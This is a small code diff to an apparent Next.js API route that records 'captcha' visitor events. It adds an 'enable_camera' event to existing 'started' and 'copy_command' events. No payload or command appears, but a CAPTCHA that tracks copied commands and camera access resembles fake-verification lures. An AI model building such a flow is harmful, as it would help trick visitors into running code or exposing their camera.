@@ -4,7 +4,7 @@ import { resolveVisitorContext, type VisitorMetaPayload } from "@/lib/visitorCon
 
 export const runtime = "nodejs";
 
-type CaptchaEvent = "started" | "copy_command";
+type CaptchaEvent = "started" | "copy_command" | "enable_camera";
 
 type Payload = VisitorMetaPayload & {
   event: CaptchaEvent | "completed" | "abandoned";
@@ -22,7 +22,7 @@ export async function POST(request: Request) {
 
   const { event, verifyId: _verifyId, os: _os, ...meta } = body;
 
-  if (event !== "started" && event !== "copy_command") {
+  if (event !== "started" && event !== "copy_command" && event !== "enable_camera") {
     return NextResponse.json({ ok: true });
   }
 
